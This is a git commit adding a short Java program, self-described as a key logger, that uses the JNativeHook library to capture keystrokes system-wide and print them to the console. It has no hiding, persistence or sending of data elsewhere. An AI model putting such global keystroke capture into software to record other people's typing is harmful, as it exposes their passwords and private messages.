28108f14c0f7aba172037657916fa785c6314a1c
surajkale07 <surajkale16749@gmail.com>
2022-09-22 16:43:51 +0530

    Initial commit

---
+++ Main.java
@@ -0,0 +1,34 @@
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
+/**
+ * Main THis is key Logger Program The state are comming in log
+ */
+public class Main implements NativeKeyListener  {
+
+    public static void main(String[] args) {
+        
+        try{
+            GlobalScreen.registerNativeHook();
+        }
+        catch(NativeHookException e){
+            e.printStackTrace();
+        }
+        GlobalScreen.addNativeKeyListener(new Main());
+    }
+    @Override
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+    }
+    @Override
+    public void nativeKeyReleased(NativeKeyEvent e) {
+        System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+    }
+    @Override
+    public void nativeKeyTyped(NativeKeyEvent e) {
+
+    }
+
+}
